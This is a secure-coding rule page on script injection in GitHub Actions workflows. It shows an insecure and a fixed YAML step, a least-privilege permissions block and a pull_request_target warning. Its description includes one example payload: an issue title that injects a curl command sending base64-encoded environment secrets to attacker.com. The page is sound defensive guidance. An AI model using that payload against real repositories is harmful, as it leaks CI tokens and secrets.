# CR-CICD-001: CI/CD Pipeline Script Injection & Untrusted PR Checkout

| Attribute | Details |
|---|---|
| **Rule ID** | `CR-CICD-001` |
| **Category** | Security |
| **Severity** | Critical |
| **Confidence** | High |
| **CWE** | [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html) |
| **OWASP Top 10** | A03:2021 - Injection |

---

## Description
In GitHub Actions and CI/CD pipelines, expressions like `${{ github.event.issue.title }}` or `${{ github.event.pull_request.head.ref }}` are expanded before the shell script runs. If an attacker submits a PR or issue titled `test"; curl https://attacker.com/$(env | base64) #`, the expanded string is executed directly by the bash runner with the workflow's `GITHUB_TOKEN` and repository secrets.

---

## Non-Compliant Code Example
```yaml
# Insecure: bash evaluates unescaped string
- name: Echo issue title
  run: |
    echo "Issue title is: ${{ github.event.issue.title }}"
```

---

## Compliant Solution
Pass untrusted expressions through environment variables. The shell receives the parameter via standard environment variables without evaluating internal delimiters:

```yaml
- name: Echo issue title securely
  env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    echo "Issue title is: $TITLE"
```

---

## Least-Privilege GitHub Actions Permissions Matrix
Always restrict default `GITHUB_TOKEN` permissions explicitly at the root of the workflow or per-job level:

```yaml
permissions:
  contents: read
  issues: read
  pull-requests: write
  id-token: none
  packages: none
```

### Insecure `pull_request_target` Warning
Never checkout the PR head branch (`github.event.pull_request.head.sha`) when using `on: pull_request_target`. That trigger gives the runner write access to repository secrets and release environments. If you must inspect untrusted PR code, run the checkout job in an unprivileged separate runner or use the standard `on: pull_request` trigger.

